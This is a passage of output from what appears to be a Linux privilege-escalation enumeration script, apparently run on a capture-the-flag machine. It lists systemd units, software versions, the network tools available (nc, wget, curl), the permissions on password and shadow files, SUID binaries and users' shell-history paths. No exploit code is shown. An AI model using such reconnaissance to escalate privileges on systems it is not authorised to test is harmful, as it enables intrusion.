-rw-r--r-- 1 root root  658 Apr  1  2020 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  490 Apr  1  2020 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  739 Apr  1  2020 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  779 Apr  1  2020 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  852 Apr  1  2020 systemd-udev-settle.service
-rw-r--r-- 1 root root  753 Apr  1  2020 systemd-udev-trigger.service
-rw-r--r-- 1 root root  635 Apr  1  2020 systemd-udevd-control.socket
-rw-r--r-- 1 root root  610 Apr  1  2020 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  426 Apr  1  2020 time-set.target
-rw-r--r-- 1 root root  479 Apr  1  2020 time-sync.target
-rw-r--r-- 1 root root  445 Apr  1  2020 timers.target
-rw-r--r-- 1 root root  457 Apr  1  2020 umount.target
-rw-r--r-- 1 root root  432 Apr  1  2020 user.slice
-rw-r--r-- 1 root root  498 Apr  1  2020 lxd-agent.service
-rw-r--r-- 1 root root  489 Apr  1  2020 lxd-agent-9p.service
-rw-r--r-- 1 root root  155 Mar 27  2020 phpsessionclean.service
-rw-r--r-- 1 root root  144 Mar 27  2020 phpsessionclean.timer
-rw-r--r-- 1 root root  561 Mar  3  2020 xfs_scrub@.service
-rw-r--r-- 1 root root  376 Mar  3  2020 xfs_scrub_all.service
-rw-r--r-- 1 root root  250 Mar  3  2020 xfs_scrub_all.timer
-rw-r--r-- 1 root root  272 Mar  3  2020 xfs_scrub_fail@.service
-rw-r--r-- 1 root root  482 Feb 25  2020 man-db.service
-rw-r--r-- 1 root root  164 Feb 25  2020 man-db.timer
-rw-r--r-- 1 root root  400 Feb 13  2020 blk-availability.service
-rw-r--r-- 1 root root  341 Feb 13  2020 dm-event.service
-rw-r--r-- 1 root root  248 Feb 13  2020 dm-event.socket
-rw-r--r-- 1 root root  323 Feb 13  2020 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  239 Feb 13  2020 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  602 Feb 13  2020 lvm2-monitor.service
-rw-r--r-- 1 root root  338 Feb 13  2020 lvm2-pvscan@.service
lrwxrwxrwx 1 root root    9 Feb 13  2020 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  454 Feb 13  2020 irqbalance.service
-rw-r--r-- 1 root root  358 Feb 11  2020 dmesg.service
-rw-r--r-- 1 root root  316 Feb 11  2020 cron.service
-rw-r--r-- 1 root root  222 Feb 10  2020 usb_modeswitch@.service
-rw-r--r-- 1 root root  266 Jan 21  2020 ufw.service
-rw-r--r-- 1 root root  997 Dec 10  2019 upower.service
-rw-r--r-- 1 root root  171 Nov 30  2019 usbmuxd.service
-rw-r--r-- 1 root root  312 Nov 27  2019 console-setup.service
-rw-r--r-- 1 root root  287 Nov 27  2019 keyboard-setup.service
-rw-r--r-- 1 root root  330 Nov 27  2019 setvtrgb.service
-rw-r--r-- 1 root root  246 Nov 11  2019 apport-forward.socket
-rw-r--r-- 1 root root  142 Nov 11  2019 apport-forward@.service
-rw-r--r-- 1 root root  175 Aug 11  2019 polkit.service
-rw-r--r-- 1 root root  604 Jul  8  2019 secureboot-db.service
-rw-r--r-- 1 root root  695 Jan 21  2019 logrotate.service
-rw-r--r-- 1 root root  347 Nov 12  2018 atd.service
-rw-r--r-- 1 root root  618 Oct  2  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct  2  2018 friendly-recovery.target
-rw-r--r-- 1 root root  192 Jan  4  2018 logrotate.timer

/lib/systemd/system/system-update.target.wants:
total 0
lrwxrwxrwx 1 root root 31 May 11  2023 fwupd-offline-update.service -> ../fwupd-offline-update.service
lrwxrwxrwx 1 root root 36 Sep 23  2020 packagekit-offline-update.service -> ../packagekit-offline-update.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Mar 27  2023 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Mar 27  2023 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Mar 27  2023 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Mar 27  2023 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Mar 27  2023 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Mar 27  2023 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Mar 27  2023 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Oct 25  2022 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 29 Nov  2  2020 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 Nov  2  2020 plymouth-quit.service -> ../plymouth-quit.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Mar 27  2023 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Mar 27  2023 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Mar 27  2023 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Mar 27  2023 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Mar 27  2023 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Mar 27  2023 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Mar 27  2023 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Oct 25  2022 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Mar 27  2023 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Mar 27  2023 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Mar 27  2023 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Mar 27  2023 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Mar 27  2023 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Mar 27  2023 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Mar 27  2023 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Mar 27  2023 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 27 Mar 27  2023 sys-kernel-tracing.mount -> ../sys-kernel-tracing.mount
lrwxrwxrwx 1 root root 36 Mar 27  2023 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Mar 27  2023 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 36 Mar 27  2023 systemd-boot-system-token.service -> ../systemd-boot-system-token.service
lrwxrwxrwx 1 root root 30 Mar 27  2023 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 32 Mar 27  2023 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Mar 27  2023 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Mar 27  2023 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Mar 27  2023 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Mar 27  2023 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Mar 27  2023 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 27 Mar 27  2023 systemd-sysusers.service -> ../systemd-sysusers.service
lrwxrwxrwx 1 root root 37 Mar 27  2023 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Mar 27  2023 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 31 Mar 27  2023 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Mar 27  2023 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 30 Mar 27  2023 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Nov  2  2020 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Mar 27  2023 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Feb 16  2022 debian.conf

/lib/systemd/system/user-.slice.d:
total 4.0K
-rw-r--r-- 1 root root 486 Apr  1  2020 10-defaults.conf

/lib/systemd/system/user@.service.d:
total 4.0K
-rw-r--r-- 1 root root 125 Feb 16  2022 timeout.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Nov  2  2020 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Nov  2  2020 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 28 Nov  2  2020 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 26 Nov  2  2020 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/local-fs.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-generators:
total 476K
-rwxr-xr-x 1 root root 5.0K Jun 29  2023 cloud-init-generator
-rwxr-xr-x 1 root root  31K May 29  2023 snapd-generator
-rwxr-xr-x 1 root root  15K Mar 27  2023 systemd-bless-boot-generator
-rwxr-xr-x 1 root root  35K Mar 27  2023 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  15K Mar 27  2023 systemd-debug-generator
-rwxr-xr-x 1 root root  39K Mar 27  2023 systemd-fstab-generator
-rwxr-xr-x 1 root root  19K Mar 27  2023 systemd-getty-generator
-rwxr-xr-x 1 root root  35K Mar 27  2023 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  15K Mar 27  2023 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  15K Mar 27  2023 systemd-rc-local-generator
-rwxr-xr-x 1 root root  15K Mar 27  2023 systemd-run-generator
-rwxr-xr-x 1 root root  15K Mar 27  2023 systemd-system-update-generator
-rwxr-xr-x 1 root root  35K Mar 27  2023 systemd-sysv-generator
-rwxr-xr-x 1 root root  19K Mar 27  2023 systemd-veritysetup-generator
lrwxrwxrwx 1 root root   22 Jun 29  2022 netplan -> ../../netplan/generate
-rwxr-xr-x 1 root root 148K Feb 13  2020 lvm2-activation-generator
-rwxr-xr-x 1 root root  286 Jun 21  2019 friendly-recovery

/lib/systemd/system-shutdown:
total 8.0K
-rwxr-xr-x 1 root root 252 May 11  2023 fwupd.shutdown
-rwxr-xr-x 1 root root 160 Sep 28  2020 mdadm.shutdown

/lib/systemd/catalog:
total 160K
-rw-r--r-- 1 root root  13K Mar 27  2023 systemd.be.catalog
-rw-r--r-- 1 root root 9.8K Mar 27  2023 systemd.be@latin.catalog
-rw-r--r-- 1 root root  14K Mar 27  2023 systemd.bg.catalog
-rw-r--r-- 1 root root  15K Mar 27  2023 systemd.catalog
-rw-r--r-- 1 root root  471 Mar 27  2023 systemd.de.catalog
-rw-r--r-- 1 root root  13K Mar 27  2023 systemd.fr.catalog
-rw-r--r-- 1 root root  16K Mar 27  2023 systemd.it.catalog
-rw-r--r-- 1 root root  15K Mar 27  2023 systemd.pl.catalog
-rw-r--r-- 1 root root 8.1K Mar 27  2023 systemd.pt_BR.catalog
-rw-r--r-- 1 root root  20K Mar 27  2023 systemd.ru.catalog
-rw-r--r-- 1 root root 7.1K Mar 27  2023 systemd.zh_CN.catalog
-rw-r--r-- 1 root root 7.1K Mar 27  2023 systemd.zh_TW.catalog

/lib/systemd/network:
total 32K
-rw-r--r-- 1 root root  44 Feb 15  2023 73-usb-net-by-mac.link
-rw-r--r-- 1 root root 645 Apr  1  2020 80-container-host0.network
-rw-r--r-- 1 root root 718 Apr  1  2020 80-container-ve.network
-rw-r--r-- 1 root root 704 Apr  1  2020 80-container-vz.network
-rw-r--r-- 1 root root  78 Apr  1  2020 80-wifi-adhoc.network
-rw-r--r-- 1 root root 101 Apr  1  2020 80-wifi-ap.network.example
-rw-r--r-- 1 root root  64 Apr  1  2020 80-wifi-station.network.example
-rw-r--r-- 1 root root 491 Apr  1  2020 99-default.link

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 1.5K Apr  1  2020 90-systemd.preset

/lib/systemd/user:
total 140K
drwxr-xr-x 2 root root 4.0K Jul 28  2023 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jul 28  2023 graphical-session-pre.target.wants
-rw-r--r-- 1 root root  122 May 29  2023 snapd.aa-prompt-ui.service
-rw-r--r-- 1 root root  141 May 29  2023 snapd.session-agent.service
-rw-r--r-- 1 root root  152 May 29  2023 snapd.session-agent.socket
-rw-r--r-- 1 root root  287 Apr  3  2023 ssh-agent.service
-rw-r--r-- 1 root root  546 Mar 27  2023 graphical-session-pre.target
-rw-r--r-- 1 root root  360 Oct 25  2022 dbus.service
-rw-r--r-- 1 root root  174 Oct 25  2022 dbus.socket
-rw-r--r-- 1 root root  231 Jul  4  2022 dirmngr.service
-rw-r--r-- 1 root root  165 Sep 23  2020 pk-debconf-helper.service
-rw-r--r-- 1 root root  127 Sep 23  2020 pk-debconf-helper.socket
-rw-r--r-- 1 root root  147 Jun 23  2020 glib-pacrunner.service
-rw-r--r-- 1 root root  497 Apr  1  2020 basic.target
-rw-r--r-- 1 root root  419 Apr  1  2020 bluetooth.target
-rw-r--r-- 1 root root  463 Apr  1  2020 default.target
-rw-r--r-- 1 root root  502 Apr  1  2020 exit.target
-rw-r--r-- 1 root root  484 Apr  1  2020 graphical-session.target
-rw-r--r-- 1 root root  394 Apr  1  2020 paths.target
-rw-r--r-- 1 root root  417 Apr  1  2020 printer.target
-rw-r--r-- 1 root root  442 Apr  1  2020 shutdown.target
-rw-r--r-- 1 root root  420 Apr  1  2020 smartcard.target
-rw-r--r-- 1 root root  396 Apr  1  2020 sockets.target
-rw-r--r-- 1 root root  420 Apr  1  2020 sound.target
-rw-r--r-- 1 root root  500 Apr  1  2020 systemd-exit.service
-rw-r--r-- 1 root root  657 Apr  1  2020 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  533 Apr  1  2020 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  720 Apr  1  2020 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  445 Apr  1  2020 timers.target
-rw-r--r-- 1 root root  204 Aug 28  2017 dirmngr.socket
-rw-r--r-- 1 root root  298 Aug 28  2017 gpg-agent-browser.socket
-rw-r--r-- 1 root root  281 Aug 28  2017 gpg-agent-extra.socket
-rw-r--r-- 1 root root  308 Aug 28  2017 gpg-agent-ssh.socket
-rw-r--r-- 1 root root  223 Aug 28  2017 gpg-agent.service
-rw-r--r-- 1 root root  234 Aug 28  2017 gpg-agent.socket

/lib/systemd/user/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 29 May 29  2023 snapd.session-agent.socket -> ../snapd.session-agent.socket
lrwxrwxrwx 1 root root 14 Oct 25  2022 dbus.socket -> ../dbus.socket

/lib/systemd/user/graphical-session-pre.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Jul 19  2023 ssh-agent.service -> ../ssh-agent.service

/lib/systemd/user-environment-generators:
total 20K
-rwxr-xr-x 1 root root 15K Mar 27  2023 30-systemd-environment-d-generator
-rw-r--r-- 1 root root 851 Jan  6  2021 90gpg-agent

/lib/systemd/user-preset:
total 4.0K
-rw-r--r-- 1 root root 744 Apr  1  2020 90-systemd.preset

/lib/systemd/ntp-units.d:
total 4.0K
-rw-r--r-- 1 root root 26 Apr  1  2020 80-systemd-timesync.list

/lib/systemd/system-environment-generators:
total 24K
-rwxr-xr-x 1 root root 23K May 29  2023 snapd-env-generator

/lib/systemd/logind.conf.d:
total 4.0K
-rw-r--r-- 1 root root 38 Apr 25  2022 unattended-upgrades-logind-maxdelay.conf

/lib/systemd/system-sleep:
total 8.0K
-rwxr-xr-x 1 root root 219 Apr 25  2022 unattended-upgrades
-rwxr-xr-x 1 root root  92 Aug 21  2019 hdparm

/lib/systemd/boot:
total 4.0K
drwxr-xr-x 2 root root 4.0K Jul 28  2023 efi

/lib/systemd/boot/efi:
total 148K
-rwxr-xr-x 1 root root 55K Mar 27  2023 linuxx64.efi.stub
-rwxr-xr-x 1 root root 90K Mar 27  2023 systemd-bootx64.efi

/lib/systemd/user-generators:
total 0


[00;33m### SOFTWARE #############################################[00m
[00;31m[-] Sudo version:[00m
Sudo version 1.8.31


[00;31m[-] MYSQL version:[00m
mysql  Ver 8.0.33-0ubuntu0.20.04.4 for Linux on x86_64 ((Ubuntu))


[00;31m[-] Apache version:[00m
Server version: Apache/2.4.41 (Ubuntu)
Server built:   2023-03-08T17:32:54


[00;31m[-] Apache user configuration:[00m
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[00;31m[-] Installed Apache modules:[00m
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 status_module (shared)


[00;33m### INTERESTING FILES ####################################[00m
[00;31m[-] Useful file locations:[00m
/usr/bin/nc
/usr/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[00;31m[-] Installed compilers:[00m
ii  g++                                   4:9.3.0-1ubuntu2                  amd64        GNU C++ compiler
ii  g++-9                                 9.4.0-1ubuntu1~20.04.1            amd64        GNU C++ compiler
ii  gcc                                   4:9.3.0-1ubuntu2                  amd64        GNU C compiler
ii  gcc-9                                 9.4.0-1ubuntu1~20.04.1            amd64        GNU C compiler


[00;31m[-] Can we read/write sensitive files:[00m
-rw-r--r-- 1 root root 2048 Jul 28  2023 /etc/passwd
-rw-r--r-- 1 root root 883 Nov 23  2023 /etc/group
-rw-r--r-- 1 root root 581 Dec  5  2019 /etc/profile
-rw-r----- 1 root shadow 1487 Jul 31  2023 /etc/shadow


[00;31m[-] SUID files:[00m
-rwsr-xr-x 1 root root 55528 May 30  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 67816 May 30  2023 /usr/bin/su
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 39144 May 30  2023 /usr/bin/umount
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 146888 May 29  2023 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 473576 Jul 19  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 131832 Sep 15  2023 /snap/snapd/20290/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 May 30  2023 /snap/core20/1974/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 May 30  2023 /snap/core20/1974/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 May 30  2023 /snap/core20/1974/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /snap/core20/2015/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /snap/core20/2015/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /snap/core20/2015/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 May 30  2023 /snap/core20/2015/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /snap/core20/2015/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /snap/core20/2015/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 May 30  2023 /snap/core20/2015/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /snap/core20/2015/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 May 30  2023 /snap/core20/2015/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Jul 19  2023 /snap/core20/2015/usr/lib/openssh/ssh-keysign


[00;31m[-] SGID files:[00m
-rwxr-sr-x 1 root shadow 43160 Feb  2  2023 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43168 Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root tty 35048 May 30  2023 /usr/bin/wall
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwxr-sr-x 1 root ssh 350504 Jul 19  2023 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root tty 14488 Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 31312 Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 84512 Nov 29  2022 /usr/bin/chage
-rwxr-sr-x 1 root utmp 14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 84512 Nov 29  2022 /snap/core20/1974/usr/bin/chage
-rwxr-sr-x 1 root shadow 31312 Nov 29  2022 /snap/core20/1974/usr/bin/expiry
-rwxr-sr-x 1 root crontab 350504 Apr  3  2023 /snap/core20/1974/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35048 May 30  2023 /snap/core20/1974/usr/bin/wall
-rwxr-sr-x 1 root shadow 43168 Feb  2  2023 /snap/core20/1974/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43160 Feb  2  2023 /snap/core20/1974/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 84512 Nov 29  2022 /snap/core20/2015/usr/bin/chage
-rwxr-sr-x 1 root shadow 31312 Nov 29  2022 /snap/core20/2015/usr/bin/expiry
-rwxr-sr-x 1 root crontab 350504 Jul 19  2023 /snap/core20/2015/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35048 May 30  2023 /snap/core20/2015/usr/bin/wall
-rwxr-sr-x 1 root shadow 43168 Feb  2  2023 /snap/core20/2015/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43160 Feb  2  2023 /snap/core20/2015/usr/sbin/unix_chkpwd


[00;31m[+] Files with POSIX capabilities set:[00m
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1974/usr/bin/ping = cap_net_raw+ep
/snap/core20/2015/usr/bin/ping = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
-rw-r--r-- 1 root root 2584 Feb  1  2020 /etc/gai.conf
-rw-r--r-- 1 root root 1382 Feb 11  2020 /etc/rsyslog.conf
-rw-r--r-- 1 root root 14867 Feb  1  2019 /etc/ltrace.conf
-rw-r--r-- 1 root root 92 Dec  5  2019 /etc/host.conf
-rw-r--r-- 1 root root 3028 Mar 14  2023 /etc/adduser.conf
-rw-r--r-- 1 root root 34 Apr 14  2020 /etc/ld.so.conf
-rw-r--r-- 1 root root 1260 Dec 14  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 7545 Jul 28  2023 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 6920 Nov  2  2021 /etc/overlayroot.conf
-rw-r--r-- 1 root root 191 Feb 18  2020 /etc/libaudit.conf
-rw-r--r-- 1 root root 642 Sep 24  2019 /etc/xattr.conf
-rw-r--r-- 1 root root 5060 Aug 21  2019 /etc/hdparm.conf
-rw-r--r-- 1 root root 604 Sep 15  2018 /etc/deluser.conf
-rw-r--r-- 1 root root 533 Jan 21  2019 /etc/logrotate.conf
-rw-r--r-- 1 root root 41 Oct 31  2022 /etc/multipath.conf
-rw-r--r-- 1 root root 685 Feb 14  2020 /etc/e2scrub.conf
-rw-r--r-- 1 root root 808 Feb 14  2020 /etc/mke2fs.conf
-rw-r--r-- 1 root root 552 Dec 17  2019 /etc/pam.conf
-rw-r--r-- 1 root root 350 Mar 14  2023 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 2351 Feb 13  2020 /etc/sysctl.conf
-rw-r--r-- 1 root root 1523 Feb 10  2020 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 2969 Aug  3  2019 /etc/debconf.conf
-rw-r--r-- 1 root root 510 Mar 14  2023 /etc/nsswitch.conf


[00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m
/home/death/.bash_history
/home/lucien/.bash_history
/home/morpheus/.bash_history


[00;31m[-] Any interesting mail in /var/mail:[00m
total 8
drwxrwsr-x  2 root mail 4096 Mar 14  2023 .
drwxr-xr-x 14 root root 4096 Jul 28  2023 ..


[00;33m### SCAN COMPLETE ####################################[00m

```